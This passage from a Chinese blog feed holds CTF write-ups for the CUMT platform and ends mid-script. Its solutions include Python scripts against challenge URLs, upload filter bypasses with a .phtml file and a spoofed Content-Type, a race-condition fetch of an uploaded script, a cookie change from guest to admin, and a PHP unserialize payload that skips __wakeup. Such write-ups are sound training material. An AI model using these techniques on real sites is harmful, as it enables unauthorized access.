href="https://qingchenldl.github.io/2018/10/13/护网杯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/护网杯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg</a></p><p><a href="https://imgchr.com/i/iUPGND" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPGND.md.png" alt="iUPGND.md.png"></a></p><p>还有一道题目是关于Laravel框架的解题过程，也是秀，知识点也很多，建议去看看一叶飘零学长的博客啦。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这比赛又学到了不少的东西，果然python开发出来的web框架还是自己的弱项，条件竞争这东西看来现在比赛都很流行呢，可惜自己对这方面的做题敏感度不够，以前一直认为这只有安恒的月赛才会出，以后还是得接触pwn了，继续努力。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;护网杯的这次比赛还是很有收获的，至少在web方面我认为是这样
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CUMT平台的部分题解</title>
    <link href="0verwatch.top/CUMT-CTF-Platform.html"/>
    <id>0verwatch.top/CUMT-CTF-Platform.html</id>
    <published>2018-09-30T06:59:37.000Z</published>
    <updated>2018-12-18T11:55:27.244Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在上网路安全实验课程的时候，其中一个任务就是完成这里面的题目，我还是记录一下吧，<a id="more"></a>,到时候补充到实验报告里面</p><h2 id="basic部分"><a href="#basic部分" class="headerlink" title="basic部分"></a>basic部分</h2><h4 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h4><p>这个题目下载之后是一个压缩包，但是里面什么东西也没有，于是放进HXD里面查看是否有其他的东西，打开发现十六进制编码，用Hackbar解码得到flag<br><a href="https://imgchr.com/i/ilTbin" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilTbin.md.png" alt="ilTbin.md.png"></a><br><a href="https://imgchr.com/i/ilTLR0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilTLR0.md.png" alt="ilTLR0.md.png"></a></p><h4 id="白驹过隙"><a href="#白驹过隙" class="headerlink" title="白驹过隙"></a>白驹过隙</h4><p>题目的意思是说快，打开页面就会发现错过了flag之类的操作，肯定是存在跳转，老题目要么就抓包，要么就curl一下，这里我选择用vps来curl一下这个网址，直接出flag<br><a href="https://imgchr.com/i/ilTjMT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilTjMT.md.png" alt="ilTjMT.md.png"></a></p><h4 id="齐白石"><a href="#齐白石" class="headerlink" title="齐白石"></a>齐白石</h4><p>这尼玛我感觉这是异形。。关齐白石什么事。。。根据提示先把图片在16进制编辑器打开看一下<br>，拉到最后一行发现flag<br><a href="https://imgchr.com/i/ilTvsU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilTvsU.md.png" alt="ilTvsU.md.png"></a></p><h4 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h4><p>打开文件会发现一堆混淆，怀疑是js混淆，然后放进火狐的js调试器里面直接执行就出现flag了<br><a href="https://imgchr.com/i/ilTxLF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilTxLF.md.png" alt="ilTxLF.md.png"></a></p><h4 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h4><p>这个题目就是考了Windows下面的一个DNS解析的hosts文件，其实这是个历史遗留问题，就是每次要去经过DNS解析的时候都会默认先去找一下这个host文件里面的相关域名所对应的ip就会免去查上层DNS服务器里面的东西，所以我们只要在hosts文件下面添加，这一行，然后输入题目对应的的域名即可<br>host文件的目录:<code>C:\Windows\System32\drivers\etc\hosts</code></p><p><a href="https://imgchr.com/i/il7pdJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7pdJ.md.png" alt="il7pdJ.md.png"></a><br><a href="https://imgchr.com/i/il79o9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il79o9.md.png" alt="il79o9.md.png"></a></p><h4 id="forfun2"><a href="#forfun2" class="headerlink" title="forfun2"></a>forfun2</h4><p>这题也是骚气，我他喵一直查看源代码都没找到，结果我在原网页上点击了查看背景图片，就出现flag了受不了。。。这题有点坑。。以前都没试过网网页图片上隐藏信息想。。。。<br><a href="https://imgchr.com/i/il7PiR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7PiR.md.png" alt="il7PiR.md.png"></a></p><h4 id="forfun"><a href="#forfun" class="headerlink" title="forfun"></a>forfun</h4><p>这个题目就是一直右击查看源代码，找到flag为止，flag在其中的这个页面下如图<br><a href="https://imgchr.com/i/il7iJ1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7iJ1.md.png" alt="il7iJ1.md.png"></a><br>进去之后用<code>ctrl+f</code>找到对应的flag<br><a href="https://imgchr.com/i/il7FRx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7FRx.md.png" alt="il7FRx.md.png"></a></p><h4 id="签到1"><a href="#签到1" class="headerlink" title="签到1"></a>签到1</h4><p>打开题目让我们check the source code !!，点击右键查看源代码发现一段base64，解码得到<code>flag{this_is_so_easy_is_it?}</code><br><a href="https://imgchr.com/i/il7EQK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7EQK.md.png" alt="il7EQK.md.png"></a></p><h4 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h4><p>打开网站发现http header!!!<br>然后F12去看看http头部的信息，发现flag<br><img src="https://s1.ax1x.com/2018/09/30/il7VsO.png" alt="il7VsO.png"></p><h4 id="超简单的密码"><a href="#超简单的密码" class="headerlink" title="超简单的密码"></a>超简单的密码</h4><p>这一个题目很明显的提示，注意看键盘很显然这是个键盘密码，从键盘上翻译一下就好得到<br>flag{isee}</p><h4 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h4><p>下载下来是一个ppt，ppt里面没发现些什么，但是这个东西是需要解密的<br>然后放到16进制编辑器里面看一下发现有zip包的文件头，于是就开始把这个文件后缀改为zip打开<br><img src="https://s1.ax1x.com/2018/09/30/il7ndH.png" alt="il7ndH.png"></p><p>在里面找到一个很奇怪的图片文件，其余的图片都能显示就他不能，放进16进制编辑器看一下发现ppt的base64加密的密码，解开之后就是ppt密码<code>cumt2017ctf</code><br><a href="https://imgchr.com/i/il7uod" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7uod.md.png" alt="il7uod.md.png"></a><br>再把文件后缀改为ppt，输入密码，移动一下ppt就发现flag了<br><a href="https://imgchr.com/i/il7MFA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7MFA.md.png" alt="il7MFA.md.png"></a></p><h4 id="Fast-30"><a href="#Fast-30" class="headerlink" title="Fast 30"></a>Fast 30</h4><p>这明显就是一个脚本题，叫你2s内post你发现的东西，可以在http header里面发现有个flag选项想必就是把这个东西给post上去，参数是key，下面是我写的脚本<br><img src="https://s1.ax1x.com/2018/09/30/il7QJI.png" alt="il7QJI.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://web.bxsteam.xyz/fast/'</span></span><br><span class="line">req = requests.Session()</span><br><span class="line"></span><br><span class="line">ans = req.get(url)</span><br><span class="line"></span><br><span class="line">param =  ans.headers[<span class="string">'Flag'</span>]</span><br><span class="line"></span><br><span class="line">flag = req.post(url,data=&#123;<span class="string">'key'</span>:param&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag.content</span><br></pre></td></tr></table></figure><p>得到flag<br><img src="https://s1.ax1x.com/2018/09/30/il78Qf.png" alt="il78Qf.png"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><p>这个题目是查找页面的元素，打开之后发现一段可疑的信息其实就是把里面的中文字体去掉就是flag<br><a href="https://imgchr.com/i/il7Gy8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7Gy8.md.png" alt="il7Gy8.md.png"></a></p><h4 id="colorSnake"><a href="#colorSnake" class="headerlink" title="colorSnake"></a>colorSnake</h4><p>这个题目还是很有意思的，虽然要写个脚本当然你也可以手动去执行。。。这个进去就是一个小游戏，点击右键查看源码后发现显示分数的地方id是score，查看他的源代码发现还存在一个game.js的代码脚本，于是立即在里面搜关于score的信息<br>然后发现了这样的一段代码，同时发现一个很可疑的php代码，这里面有个xhr，介绍一下xhr，xhr叫XMLHttpRequest ，XMLHttpRequest 对象提供了对 HTTP 协议的完全的访问，包括做出 POST 和 HEAD 请求以及普通的 GET 请求的能力。XMLHttpRequest 可以同步或异步地返回 Web 服务器的响应，并且能够以文本或者一个 DOM 文档的形式返回内容。<br><a href="https://imgchr.com/i/il7NwQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7NwQ.md.png" alt="il7NwQ.md.png"></a></p><p>也就是去访问这个页面的功能，我也去访问，发现有json格式的东西，把里面的msg部分的内容unicode解码，发现提示，这么久才吃到一个，零分！可以猜到应该是用这个去访问页面去增加得分，每刷新一下这个页面发现score加一了，但是刷新的太快又会重新置0，所以我就写了个小脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://202.119.201.199/challenge/web/colorSnake/getScore.php'</span></span><br><span class="line">req = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">55</span>):    <span class="comment">#怕会出现重新置零的现象，因此设置的数比50大</span></span><br><span class="line">time.sleep(<span class="number">1</span>)    <span class="comment">#用于延时</span></span><br><span class="line">ans = req.get(url)</span><br><span class="line">msg = json.loads(ans.content)[<span class="string">'msg'</span>]</span><br><span class="line"><span class="keyword">print</span> json.loads(ans.content)[<span class="string">'score'</span>],msg.encode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure></p><p>最后得到flag<br><img src="https://s1.ax1x.com/2018/09/30/il7dFs.png" alt="il7dFs.png"></p><h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><p>备份这个题目感觉也是一个脚本题目，一进去题目就提示There are too much baks in the website ,can you find the flag in these baks?，说明我们要遍历多个bak文件并且读取里面的内容。。。只要get请求就能下在相关bak文件了<br><a href="https://imgchr.com/i/il7DS0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7DS0.md.png" alt="il7DS0.md.png"></a><br>直接放上我写的脚本。。。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://202.119.201.199/challenge/web/code/&#123;num&#125;.bak"</span></span><br><span class="line">res = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1500</span>):      <span class="comment">#开大点无所谓</span></span><br><span class="line">payload = url.format(num=i)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans = res.get(payload)</span><br><span class="line">file_name = <span class="string">'&#123;_&#125;.bak'</span>.format(_=i)</span><br><span class="line"><span class="comment">#print file_name</span></span><br><span class="line"><span class="keyword">with</span> open(file_name, <span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">   file_content = code.write(ans.content)</span><br><span class="line">   code.close()</span><br><span class="line">   <span class="keyword">print</span> file_name</span><br><span class="line">   f = open(file_name,<span class="string">'rb'</span>)</span><br><span class="line">   read_content = f.read()</span><br><span class="line">   <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> read_content:  </span><br><span class="line">   <span class="keyword">print</span> read_content</span><br><span class="line">   <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">print</span> <span class="string">'Waiting!!!!!'</span></span><br><span class="line">   f.close()</span><br></pre></td></tr></table></figure></p><p>结果应该是第998个bak文件里面有flag<br><img src="https://s1.ax1x.com/2018/09/30/il7gw4.png" alt="il7gw4.png"></p><h4 id="上传一"><a href="#上传一" class="headerlink" title="上传一"></a>上传一</h4><p>打开页面让我们上传图片文件，尝试用bp抓包发包<br>发现<br><img src="https://s1.ax1x.com/2018/09/30/il72TJ.png" alt="il72TJ.png"><br>所以就是让我们上一个可执行的文件，那就尝试把后缀名改名为php，然后就得到两个flag了，这太水了吧，这题还送一个flag。。。。上传二也秒掉了<br><a href="https://imgchr.com/i/il7Wk9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7Wk9.md.png" alt="il7Wk9.md.png"></a></p><h4 id="上传二"><a href="#上传二" class="headerlink" title="上传二"></a>上传二</h4><p>其实也是上传一的页面，这个题目其实想要修改的是Content-Type:这个参数，由于我上一题是直接上传一个图片上去的，这样一来就导致直接出来两个flag，这题只要是Content-Type: image/jpeg这个类型就可以出flag，如果一开始你上传一上传的不是图片的话，而是一般的文件流的话们这里的Content-Type显示的是application/stream之类的东西，就不会两个flag出来的<br><img src="https://s1.ax1x.com/2018/09/30/il7hf1.png" alt="il7hf1.png"></p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie?"></a>Cookie?</h4><p>页面请求以管理员身份进行登录，尝试用bp抓包查看<br>把包里面cookie里面的值改一下，一开始是guest，我们改成admin，发包<br>得到下面这个页面<br><img src="https://s1.ax1x.com/2018/09/30/il7Il6.png" alt="il7Il6.png"><br>有个key还有个密文，猜测是应该是维吉尼亚密码，把该网页中的图片拖到百度识图识别一下，果然是维吉尼亚。。。<br><a href="https://imgchr.com/i/il7o6K" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7o6K.md.png" alt="il7o6K.md.png"></a></p><p>然后我们可以在线解密，我们可以去这个页面 <a href="http://ctf.ssleye.com/vigenere.html" target="_blank" rel="noopener">http://ctf.ssleye.com/vigenere.html</a> 进行维吉尼亚密码解密<br>得到flag<br><a href="https://imgchr.com/i/il7TOO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7TOO.md.png" alt="il7TOO.md.png"></a></p><h4 id="上传三"><a href="#上传三" class="headerlink" title="上传三"></a>上传三</h4><p>这个题目属于条件竞争的题目<br>具体来讲就是在文件上传之后你要赶在服务器把它删除之前访问一下这个文件就可以了<br>这个题目抓包的时候又在相应的php文件后缀进行了过滤，把<code>php,php2,php3,php4,php5</code>等都过滤掉了，直到试到<code>phtml</code>的时候回显出来一句话<br><a href="https://imgchr.com/i/il7b0e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7b0e.md.png" alt="il7b0e.md.png"></a><br>这时候我们就发现文件被删了<br>这题可以单纯用bp直接刷，但是我还是喜欢用脚本刷，可以直接出flag，bp只能看到返回的长度不好辨别<br>我使用bp+脚本刷的，bp上面开个无payload的爆破一直发同样的包，然后脚本一直运行就可以得到flag了</p><p><a href="https://imgchr.com/i/il7Okd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7Okd.md.png" alt="il7Okd.md.png"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://202.119.201.199/challenge/web/uploadfile/upload/index.phtml'</span></span><br><span class="line"></span><br><span class="line">req = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">ans = req.get(url)</span><br><span class="line">web_content = ans.content</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> web_content:</span><br><span class="line"><span class="keyword">print</span> web_content</span><br></pre></td></tr></table></figure></p><h4 id="听说你会面向对象"><a href="#听说你会面向对象" class="headerlink" title="听说你会面向对象"></a>听说你会面向对象</h4><p>先把源代码贴一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($f)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'flag'</span>)+<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'dangerrous'</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        var_dump(file_exists(<span class="keyword">$this</span>-&gt;file));</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">if</span> (!strpos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)&amp;&amp;!strpos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'你想干嘛'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'data'</span>])&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>打开可以发现函数，这个题目考查的是反序列化的知识，这题的关键就是我们需要利用unserialize构造一个对应的类型的序列化然后去绕过wakeup函数从而利用__destruct()输出flag，绕过wakeup很简单只需要我们把对象里面的的变量个数改为跟原来的不一样就好，我们可以写一个代码构造这个序列了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Admin();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure></p><p>把输出的变量个数改为2即可<br><a href="https://imgchr.com/i/il7XtA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7XtA.md.png" alt="il7XtA.md.png"></a><br>也就是<br><code>O:5:&quot;Admin&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p><a href="https://imgchr.com/i/il7z1P" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/il7z1P.md.png" alt="il7z1P.md.png"></a></p><h4 id="自动获取flag程序"><a href="#自动获取flag程序" class="headerlink" title="自动获取flag程序"></a>自动获取flag程序</h4><p>这个题目本来意思就是想要你修改一下代码，我们那可以右键去看一下，发现有一段js代码，是通过ajax来发起请求的，发现第一部分是通过get方式访问<code>param1.php</code>然后以json格式的数据传参给<code>calParam2</code>，然后去求flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求参数一</span></span><br><span class="line">$(<span class="string">"#a"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span class="string">'param1.php'</span>,</span><br><span class="line">method:<span class="string">'get'</span>,</span><br><span class="line">dataType:<span class="string">'json'</span>,</span><br><span class="line">success:calParam2</span><br><span class="line">&#125;)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calParam2</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> data=<span class="built_in">JSON</span>.parse((d.param));</span><br><span class="line"><span class="keyword">var</span> length=data.length;</span><br><span class="line"><span class="keyword">var</span> second=<span class="keyword">new</span> <span class="built_in">Date</span>().getSeconds();</span><br><span class="line"><span class="keyword">var</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; length/<span class="number">2</span>; j++) &#123;</span><br><span class="line">sum+=<span class="built_in">parseInt</span>(data[i])*second + data[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 请求flag</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span class="string">'http://new.ctf.param.com/aram2.php?sum='</span>+sum,</span><br><span class="line">method:<span class="string">'get'</span>,</span><br><span class="line">dataType:<span class="string">'json'</span>,</span><br><span class="line">success:<span class="function"><span class="keyword">function</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">alert(s.f);</span><br><span class="line">&#125;,</span><br><span class="line">error:<span class="function"><span class="keyword">function</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">alert(<span class="string">'错了'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码后我们可以发现这里面请求flag的部分明显url就错了，这尼玛根本就不同域了，一般出题人肯定不会这样搞的,根据第一个url把第二个url改为参数为param的url：<code>param2.php?param=&#39;+sum,</code><br>当我们访问一下param1.php这个页面的时候发现是一堆url编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;param&quot;:&quot;%5B%221%22%2C%226%22%2C%222%22%2C%228%22%2C%224%22%2C%222%22%2C%228%22%2C%224%22%2C%229%22%2C%221%22%2C%2210%22%5D&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>但是在计算的这一部分功能里面上来直接就<code>JSON.parse</code>，这是一个对json格式解码的函数，但是我们第一个页面里面的东西是经过url编码过的，直接json格式解码肯定是不行的的。会报错的。<br><a href="https://imgchr.com/i/i8pukt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/04/i8pukt.md.png" alt="i8pukt.md.png"></a><br>所以我们得先用<code>unescape</code>解码，然后放进控制台里面跑一下就得到flag<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calParam2</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line">  d.param = <span class="built_in">unescape</span>(d.param);</span><br><span class="line"><span class="keyword">var</span> data=<span class="built_in">JSON</span>.parse((d.param));</span><br><span class="line"><span class="keyword">var</span> length=data.length;</span><br><span class="line"><span class="keyword">var</span> second=<span class="keyword">new</span> <span class="built_in">Date</span>().getSeconds();</span><br><span class="line"><span class="keyword">var</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; length/<span class="number">2</span>; j++) &#123;</span><br><span 